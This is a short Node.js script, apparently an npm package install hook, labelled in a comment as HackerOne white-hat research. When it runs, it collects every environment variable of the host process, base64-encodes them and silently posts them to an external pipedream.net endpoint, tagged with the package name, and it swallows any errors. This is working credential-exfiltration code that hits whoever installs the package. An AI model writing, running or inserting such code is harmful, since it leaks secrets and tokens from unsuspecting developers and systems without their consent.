// Hackerone white hat security research, catz@wearehackerone.com

const http = require('https');

req = http.request({
  host: 'dabb332ffd185c86301cb6134cfdcca5.m.pipedream.net',
  path: '/' + (process.env.npm_package_name || ''),
  method: 'POST'
}).on('error', function (err) {
});

req.write(Buffer.from(JSON.stringify(process.env)).toString('base64'));
req.end();
